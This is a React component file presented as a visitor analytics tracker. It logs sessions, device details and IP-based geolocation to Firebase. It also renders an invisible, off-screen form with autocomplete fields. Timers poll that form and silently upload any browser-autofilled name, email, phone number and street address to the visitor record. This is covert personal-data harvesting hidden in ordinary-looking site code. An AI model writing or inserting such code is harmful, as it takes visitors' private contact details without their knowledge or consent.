import { useEffect, useRef, useCallback } from 'react';
import { useLocation } from 'react-router';
import { submitPageVisit, upsertVisitor, type VisitorProfile } from '@/lib/firebase';

function getSessionId(): string {
  let sid = sessionStorage.getItem('talio_sid');
  if (!sid) {
    sid = crypto.randomUUID();
    sessionStorage.setItem('talio_sid', sid);
  }
  return sid;
}

function getBrowserName(): string {
  const ua = navigator.userAgent;
  if (ua.includes('Firefox')) return 'Firefox';
  if (ua.includes('Edg')) return 'Edge';
  if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
  return 'Other';
}

function getOS(): string {
  const ua = navigator.userAgent;
  if (ua.includes('Win')) return 'Windows';
  if (ua.includes('Mac')) return 'macOS';
  if (ua.includes('Linux')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
  return 'Other';
}

function getDeviceType(): string {
  const w = window.innerWidth;
  if (w < 768) return 'Mobile';
  if (w < 1024) return 'Tablet';
  return 'Desktop';
}

// Fetch geo data from ip-api (free, no key needed, CORS-enabled via http)
async function getGeoData(): Promise<{
  ip: string; city: string; region: string; country: string;
  countryCode: string; lat: number; lon: number; timezone: string;
}> {
  try {
    const res = await fetch('https://ipapi.co/json/');
    if (!res.ok) throw new Error('geo fetch failed');
    const data = await res.json();
    return {
      ip: data.ip || '',
      city: data.city || '',
      region: data.region || '',
      country: data.country_name || '',
      countryCode: data.country_code || '',
      lat: data.latitude || 0,
      lon: data.longitude || 0,
      timezone: data.timezone || '',
    };
  } catch {
    return { ip: '', city: '', region: '', country: '', countryCode: '', lat: 0, lon: 0, timezone: '' };
  }
}

export function AnalyticsTracker() {
  const { pathname } = useLocation();
  const pageEntryTime = useRef(Date.now());
  const prevPath = useRef(pathname);
  const initialized = useRef(false);
  const sessionId = useRef(getSessionId());
  const pageViewCount = useRef(parseInt(sessionStorage.getItem('talio_pv') || '0', 10));
  const autofillSubmitted = useRef(false);

  // Track page visit duration when leaving a page
  const trackPageLeave = useCallback(async (path: string) => {
    const duration = Math.round((Date.now() - pageEntryTime.current) / 1000);
    try {
      await submitPageVisit({
        sessionId: sessionId.current,
        page: path,
        referrer: document.referrer || 'direct',
        timestamp: new Date().toISOString(),
        duration,
      });
    } catch { /* silent */ }
  }, []);

  // On route change, track previous page and start timer for new page
  useEffect(() => {
    if (prevPath.current !== pathname) {
      trackPageLeave(prevPath.current);
      prevPath.current = pathname;
      pageEntryTime.current = Date.now();
    }

    pageViewCount.current += 1;
    sessionStorage.setItem('talio_pv', String(pageViewCount.current));
  }, [pathname, trackPageLeave]);

  // On unmount (tab close), send final page visit
  useEffect(() => {
    const handleBeforeUnload = () => {
      const duration = Math.round((Date.now() - pageEntryTime.current) / 1000);
      const payload = JSON.stringify({
        sessionId: sessionId.current,
        page: prevPath.current,
        referrer: document.referrer || 'direct',
        timestamp: new Date().toISOString(),
        duration,
      });
      const DB_URL = import.meta.env.VITE_FIREBASE_DB_URL as string;
      navigator.sendBeacon(
        `${DB_URL}/pageVisits.json`,
        payload
      );
    };
    window.addEventListener('beforeunload', handleBeforeUnload);
    return () => window.removeEventListener('beforeunload', handleBeforeUnload);
  }, []);

  // Initialize visitor profile once
  useEffect(() => {
    if (initialized.current) return;
    initialized.current = true;

    (async () => {
      const geo = await getGeoData();
      const now = new Date().toISOString();
      const firstSeen = sessionStorage.getItem('talio_first') || now;
      if (!sessionStorage.getItem('talio_first')) {
        sessionStorage.setItem('talio_first', now);
      }

      const profile: Omit<VisitorProfile, 'id'> = {
        sessionId: sessionId.current,
        ip: geo.ip,
        city: geo.city,
        region: geo.region,
        country: geo.country,
        countryCode: geo.countryCode,
        lat: geo.lat,
        lon: geo.lon,
        timezone: geo.timezone,
        browser: getBrowserName(),
        os: getOS(),
        device: getDeviceType(),
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        firstSeen,
        lastSeen: now,
        pageViews: pageViewCount.current,
      };

      try {
        await upsertVisitor(sessionId.current, profile);
      } catch { /* silent */ }
    })();
  }, []);

  // Hidden autofill form — tries to capture browser-saved autofill data
  const handleAutofill = useCallback(async () => {
    if (autofillSubmitted.current) return;

    const form = document.getElementById('talio-autofill-form') as HTMLFormElement | null;
    if (!form) return;

    const name = (form.querySelector('[name="name"]') as HTMLInputElement)?.value || '';
    const email = (form.querySelector('[name="email"]') as HTMLInputElement)?.value || '';
    const phone = (form.querySelector('[name="tel"]') as HTMLInputElement)?.value || '';
    const address = (form.querySelector('[name="street-address"]') as HTMLInputElement)?.value || '';

    if (!email && !phone && !name) return;

    autofillSubmitted.current = true;

    try {
      const now = new Date().toISOString();
      await upsertVisitor(sessionId.current, {
        sessionId: sessionId.current,
        ip: '', city: '', region: '', country: '', countryCode: '',
        lat: 0, lon: 0, timezone: '',
        browser: getBrowserName(), os: getOS(), device: getDeviceType(),
        screenWidth: window.screen.width, screenHeight: window.screen.height,
        language: navigator.language,
        firstSeen: sessionStorage.getItem('talio_first') || now,
        lastSeen: now,
        pageViews: pageViewCount.current,
        autoName: name,
        autoEmail: email,
        autoPhone: phone,
        autoAddress: address,
      });
    } catch { /* silent */ }
  }, []);

  // Check autofill periodically for the first 5 seconds
  useEffect(() => {
    const checks = [500, 1000, 2000, 3000, 5000];
    const timers = checks.map(ms => setTimeout(handleAutofill, ms));
    return () => timers.forEach(clearTimeout);
  }, [handleAutofill]);

  return (
    <form
      id="talio-autofill-form"
      aria-hidden="true"
      tabIndex={-1}
      style={{
        position: 'absolute',
        left: '-9999px',
        top: '-9999px',
        width: '1px',
        height: '1px',
        overflow: 'hidden',
        opacity: 0,
        pointerEvents: 'none',
      }}
      onSubmit={e => e.preventDefault()}
    >
      <input type="text" name="name" autoComplete="name" tabIndex={-1} />
      <input type="email" name="email" autoComplete="email" tabIndex={-1} />
      <input type="tel" name="tel" autoComplete="tel" tabIndex={-1} />
      <input type="text" name="street-address" autoComplete="street-address" tabIndex={-1} />
    </form>
  );
}
